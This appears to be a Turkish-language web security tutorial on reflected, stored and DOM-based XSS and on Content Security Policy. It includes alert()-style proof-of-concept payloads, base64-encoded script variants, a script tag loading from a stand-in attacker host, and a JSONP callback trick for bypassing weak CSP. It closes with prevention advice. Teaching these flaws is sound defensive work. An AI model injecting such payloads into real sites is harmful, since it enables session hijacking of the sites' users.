# XSS (Cross-Site Scripting)
XSS açıkları, saldırganın kurban kullanıcı gibi davranmasına, kullanıcının yapabileceği tüm işlemleri gerçekleştirmesine ve kullanıcıya ait verilere erişmesine olanak tanır. Eğer kurban kullanıcı uygulama içinde ayrıcalıklı yetkilere sahipse, saldırgan uygulamanın tüm işlevselliği ve verileri üzerinde tam kontrol sağlayabilir.

XSS, güvenlik açığı bulunan bir web uygulamasının kullanıcıya kötü amaçlı JavaScript kodu döndürmesi ile ortaya çıkar. Bu kod kurbanın tarayıcısında çalıştığında, saldırgan kurbanın uygulama ile olan etkileşimini tamamen ele geçirebilir.

## XSS Türleri
Üç ana XSS türü vardır:

* Reflected XSS – Kötü amaçlı script, mevcut HTTP isteğinden gelir.
* Stored XSS – Kötü amaçlı script, veritabanı gibi kalıcı bir depodan gelir.
* DOM-based XSS – Açık, sunucu tarafında değil istemci tarafındaki JavaScript kodunda bulunur.

## Reflected XSS
Reflected XSS, kullanıcının girdiği verinin sunucuya ulaştıktan sonra herhangi bir filtreleme veya sanitizasyon yapılmadan HTTP yanıtına dahil edilmesiyle oluşur.

Bu açık Non-Persistent olarak sınıflandırılır; sayfa kapatıldığında veya yenilendiğinde saldırı etkisiz hale gelir.

Örnek:
```html
https://insecure-website.com/status?message=All+is+well
<p>Status: All is well.</p>
```

Saldırgan URL’yi şu şekilde değiştirebilir:
```html
https://insecure-website.com/status?message=<script>alert('XSS')</script>
```

Kurban bu bağlantıya tıkladığında, script tarayıcıda kurbanın oturumu bağlamında çalışır.

## Stored XSS
Stored XSS (Persistent XSS), saldırganın enjekte ettiği kodun kalıcı olarak depolanması ve her görüntülendiğinde çalışması durumunda oluşur. Bu veri, veritabanına, loglara veya başka kalıcı depolama alanlarına kaydedilebilir.

Stored XSS en tehlikeli XSS türüdür; çünkü sayfayı ziyaret eden her kullanıcı saldırıdan etkilenir. Ayrıca genellikle manuel müdahale olmadan temizlenemez.

Örnek:
```html
<p>Hello, this is my message!</p>
```

Saldırgan şu şekilde veri gönderebilir:
```html
<p><script>alert('XSS')</script></p>
```

Bu içerik veritabanına kaydedilir ve her görüntülendiğinde çalışır.

## DOM-based XSS
DOM-based XSS, tamamen istemci tarafında (client-side) çalışan JavaScript kodunun kullanıcı girdisini filtrelemeden DOM’a yazması ile ortaya çıkar. Bu tür XSS, sunucuya gönderilen veri üzerinden değil, tarayıcıdaki Document Object Model (DOM) manipülasyonu ile tetiklenir.

Örnek:
```js
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

Eğer saldırgan `search` alanının değerini kontrol edebiliyorsa şu payload çalışabilir:

```html
<img src=1 onerror="alert('XSS')">
```

### Source & Sink
DOM-based XSS’i anlamak için Source ve Sink kavramlarını bilmek önemlidir:

* Source: Kullanıcı girdisini alan JavaScript nesnesi (örn. URL parametresi, form input’u).
* Sink: Kullanıcı girdisini DOM’a yazan fonksiyon. Eğer filtrasyon yapılmazsa XSS oluşur.

Sık kullanılan Sink fonksiyonları:
```javascript
document.write()
element.innerHTML
element.outerHTML
```

jQuery’de sık kullanılan Sink fonksiyonları:
```javascript
add()
after()
append()
```

Bu fonksiyonlar girdiyi doğrudan DOM’a yazarsa ve giriş doğrulaması yapılmazsa sayfa XSS’e açıktır.

## Content Security Policy
Content Security Policy (CSP), Cross-Site Scripting (XSS), clickjacking gibi belirli istemci tarafı saldırılarını tespit etmek ve sınırlandırmak için ek bir korumadır. Sunucu seviyesinde yapılandırılır. Yöneticiler, bir sayfa yüklendiğinde tarayıcıların uyması gereken kuralları tanımlar. Örneğin, hangi kaynaklardan script, resim veya diğer kaynakların yüklenebileceğini belirleyebilirler.

CSP iki şekilde tanımlanabilir:
- Sunucu yanıtına Content-Security-Policy HTTP header’ı ekleyerek.
- HTML sayfalarında <meta> etiketi kullanarak.

### Content Security Policy’nin Ana Direktifleri
Bir CSP, directive adı verilen kurallardan oluşur. Her direktif, belirli kaynakların yüklenmesi ve çalıştırılması için kısıtlamalar tanımlar.

#### Directive türleri:
- Fetch directives → Tarayıcıya verilerin nasıl yükleneceğini söyler.
- Diğer direktifler → Tarama, belge ve raporlama gibi ek güvenlik kontrolleri içerir.

#### Fetch directives
- default-src → Başka bir direktif tanımlanmazsa varsayılan kaynak.
- script-src → JavaScript ve WebAssembly için geçerli kaynaklar.
- script-src-elem → <script> tag’leri için geçerli kaynaklar (yoksa script-src kullanılır).
- frame-src → <frame> ve <iframe> için geçerli kaynaklar.
- img-src → Görseller için geçerli kaynaklar.
- style-src → CSS dosyaları için geçerli kaynaklar.
- font-src → Fontlar için geçerli kaynaklar.

#### Diğer önemli direktifler
- sandbox → İçeriği izole eden sandbox modunu aktif eder (<iframe> gibi).
- require-trusted-types-for → DOM tabanlı XSS saldırılarını sınırlamak için “trusted types” kullanımını zorunlu kılar.
- trusted-types → Sadece izin verilen “Trusted Types” tanımlarını çalıştırır.
- upgrade-insecure-requests → HTTP isteklerini otomatik olarak HTTPS’e çevirir.
- frame-ancestors → <frame>, <iframe>, <object>, <embed> ve <applet> için izin verilen kaynakları sınırlar.
- form-action → Formların gönderilebileceği URL’leri sınırlar.
- base-uri → <base> etiketi için geçerli kaynakları sınırlar.

#### Fetch Directives için Olası Değerler
- 'none' → Kaynağı tamamen engeller.
- 'self' → Yalnızca aynı origin’den yükleme yapılmasına izin verir.
- [host-source] → Özel bir domain veya IP tanımlar.
- [scheme-source] → Belirli bir protokole izin verir (https:, data:, ws:, vb.).
- → Herhangi bir alt domain, host veya port’a izin verir.
- 'nonce-[değer]' → Sunucu tarafından her yanıt için üretilen rastgele bir nonce değeri.
- 'unsafe-eval' → eval() gibi metin tabanlı JavaScript çalıştırılmasına izin verir.
- 'unsafe-inline' → Inline script, event attribute (onclick) ve javascript: URL’lerine izin verir.
- Yanlış yapılandırılmış değerler, özellikle XSS saldırılarına kapı açabilir.

### Content Security Policy Örneği
Sunucu, tarayıcıya CSP’yi HTTP yanıtında iletebilir:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://*.example.com; object-src 'none'; img-src 'self' data: *.vaadata.com;
```

Bu konfigürasyon:
- default-src 'self' → Tanımsız tüm kaynak türleri sadece aynı origin’den yüklenir.
- script-src 'self' https://*.example.com → Sadece example.com alt domainlerinden script yüklenir.
- object-src 'none' → <object> ve <embed> tamamen yasak.
- img-src 'self' data: .example.com → Görseller sadece self, data: şeması ve example.com alt domainlerinden yüklenebilir.

### CSP Bypass Teknikleri
#### unsafe-inline kullanımı
```http
Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline';
```

Bu durumda inline script’ler çalışabilir:
```js
<script>alert(1);</script>
```

#### unsafe-eval kullanımı
```http
Content-Security-Policy: default-src 'none'; script-src 'unsafe-eval' data:;
```

eval() veya Function() çağrıları yapılabilir. Ayrıca data: şemasıyla Base64 kodlu script çalıştırılabilir:
```js
<script src="data:;base64,YWxlcnQoMSk="></script>
```

#### script-src'de wildcard (*) kullanımı
```http
Content-Security-Policy: default-src 'none'; script-src https://vaadata.com *;
```

Saldırgan kendi sunucusundan script yükleyebilir:
```js
<script src="https://evil.vaadata.at"></script>
```

### object-src ve default-src eksikliği
```http
Content-Security-Policy: script-src 'self'; img-src 'self';
```

<object> etiketi ile Base64 kodlu zararlı script yüklenebilir:
```js
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

#### JSONP endpoint istismarı
```http
Content-Security-Policy: default-src 'none'; script-src https://hello.vaadata.com/test.js https://accounts.google.com/o/oauth2/revoke;
```

İzin verilen domainlerde JSONP endpoint varsa callback parametresi ile XSS yapılabilir:
```url
https://accounts.google.com/o/oauth2/revoke?callback=alert(1)
```

## XSS Saldırılarını Önlemek
CSP, XSS gibi zafiyetlerin kötüye kullanılmasını sınırlayan veya önleyen ek bir koruma katmanı sağlar. Bu saldırılara karşı ilk savunma hattı hâlâ input validation ve output encoding yöntemleridir. Genel olarak, CSP aşağıdaki noktalar dikkate alınmalıdır:

* Restriktif bir default-src direktifi tanımlayın.
* Sıkı bir object-src direktifi uygulayın (ideal olarak none).
* unsafe-eval ve unsafe-inline değerlerinden kaçının. Genel kural olarak, ‘unsafe’ içeren direktifleri yasaklayın; yalnızca etkilerini tam olarak anladığınızda izin verin.
* Harici sunuculardan script yüklemeye izin vermeyin.
* Wildcard (*) kullanımını en aza indirin.
* Güvenliği güçlendirmek için nonce kullanın.
* CSP’nizin sağlamlığını özel araçlar kullanarak test edin